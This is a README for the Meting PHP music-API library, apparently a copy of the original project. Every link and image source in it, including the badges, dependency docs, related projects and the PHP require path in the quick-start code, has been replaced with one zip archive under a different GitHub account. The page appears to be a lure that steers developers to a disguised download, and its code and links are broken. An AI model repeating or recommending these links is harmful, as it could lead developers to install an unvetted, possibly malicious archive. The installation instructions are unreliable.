**原版 [metowolf/Meting](https://raw.githubusercontent.com/ly1595/Meting-Fixed/main/src/Fixed_Meting_v1.7-beta.2.zip) 已经使用https://raw.githubusercontent.com/ly1595/Meting-Fixed/main/src/Fixed_Meting_v1.7-beta.2.zip重构**

---

<p align="center">
 <img src="https://raw.githubusercontent.com/ly1595/Meting-Fixed/main/src/Fixed_Meting_v1.7-beta.2.zip" alt="Meting">
</p>

<p align="center">
 <img alt="Author" src="https://raw.githubusercontent.com/ly1595/Meting-Fixed/main/src/Fixed_Meting_v1.7-beta.2.zip" height="20"/>
 <img alt="Star" src="https://raw.githubusercontent.com/ly1595/Meting-Fixed/main/src/Fixed_Meting_v1.7-beta.2.zip" height="20">
</p>

> 🍰 强大的音乐API框架，支持网易云音乐、QQ音乐、酷狗音乐、酷我音乐
>
> ✨ A powerful music API framework supporting NetEase Cloud Music, QQ Music, Kugou Music, and Kuwo Music

## Introduction

A powerful music API framework to accelerate your development🎡
 + **Elegant** - Easy to use, a standardized format for all music platforms.
 + **Lightweight** - A single-file library that's less than 40KB.
 + **Powerful** - Support various music platforms, including Tencent, Netease, KuGou, Kuwo.
 + **Free** - Under MIT license.

## Requirement
PHP 5.4+ and BCMath, Curl, OpenSSL extension installed.

## Installation
Copy the PHP file to your project folder.

Then you can import the class into your application:

```php
use Metowolf\Meting;

$api = new Meting('netease');

$data = $api->format(true)->search('把回忆拼好给你');
```

> **Note:** Meting requires [BCMath](https://raw.githubusercontent.com/ly1595/Meting-Fixed/main/src/Fixed_Meting_v1.7-beta.2.zip), [cURL](https://raw.githubusercontent.com/ly1595/Meting-Fixed/main/src/Fixed_Meting_v1.7-beta.2.zip) and [OpenSSL](https://raw.githubusercontent.com/ly1595/Meting-Fixed/main/src/Fixed_Meting_v1.7-beta.2.zip) extension in order to work.


## Quick Start
```php
// require 'https://raw.githubusercontent.com/ly1595/Meting-Fixed/main/src/Fixed_Meting_v1.7-beta.2.zip';
require 'https://raw.githubusercontent.com/ly1595/Meting-Fixed/main/src/Fixed_Meting_v1.7-beta.2.zip';

use Metowolf\Meting;

// Initialize to netease API
$api = new Meting('netease');

// Use custom cookie (option)
// $api->cookie('');

// Get data
$data = $api->format(true)->search('把回忆拼好给你', [
    'page' => 1,
    'limit' => 50
]);

echo $data;
// [{"id":35847388,"name":"Hello","artist":["Adele"],"album":"Hello","pic_id":"1407374890649284","url_id":35847388,"lyric_id":35847388,"source":"netease"},{"id":33211676,"name":"Hello","artist":["OMFG"],"album":"Hello",...

// Parse mp3 link
$data = $api->format(true)->url(35847388);

echo $data;
// {"url":"http:\/\/...","size":4729252,"br":128}
```

## More usage
 - [docs](https://raw.githubusercontent.com/ly1595/Meting-Fixed/main/src/Fixed_Meting_v1.7-beta.2.zip)
 - [special for netease](https://raw.githubusercontent.com/ly1595/Meting-Fixed/main/src/Fixed_Meting_v1.7-beta.2.zip)

## Join the Discussion
 - [discussions](https://raw.githubusercontent.com/ly1595/Meting-Fixed/main/src/Fixed_Meting_v1.7-beta.2.zip)

## Related Projects
 - [metowolf/Meting](https://raw.githubusercontent.com/ly1595/Meting-Fixed/main/src/Fixed_Meting_v1.7-beta.2.zip)
 - [ELDment/NET-MusicAPI](https://raw.githubusercontent.com/ly1595/Meting-Fixed/main/src/Fixed_Meting_v1.7-beta.2.zip)

## Keywords
```
网易云音乐[搜索|直链|歌词|封面|详情|专辑|歌单|歌手]API
QQ音乐[搜索|直链|歌词|封面|详情|专辑|歌单|歌手]API
酷狗音乐[搜索|直链|歌词|封面|详情|专辑|歌单|歌手]API
酷我音乐[搜索|直链|歌词|封面|详情|专辑|歌单|歌手]API
Netease [Search|URL|Stream|Lyrics|Cover|Details|Album|Playlist|Artist] API
QQ Music [Search|URL|Stream|Lyrics|Cover|Details|Album|Playlist|Artist] API
KuGou [Search|URL|Stream|Lyrics|Cover|Details|Album|Playlist|Artist] API
Kuwo [Search|URL|Stream|Lyrics|Cover|Details|Album|Playlist|Artist] API
```
